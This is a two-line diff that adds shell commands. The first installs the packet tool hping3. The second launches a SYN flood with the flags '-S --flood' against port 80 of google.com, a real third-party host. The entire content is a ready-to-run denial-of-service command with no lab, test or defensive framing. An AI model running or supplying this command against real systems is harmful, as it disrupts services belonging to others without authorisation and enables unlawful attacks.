@@ -1,0 +1,2 @@
+sudo apt-get -y install hping3 
+sudo hping3 -S --flood -V -p 80 google.com
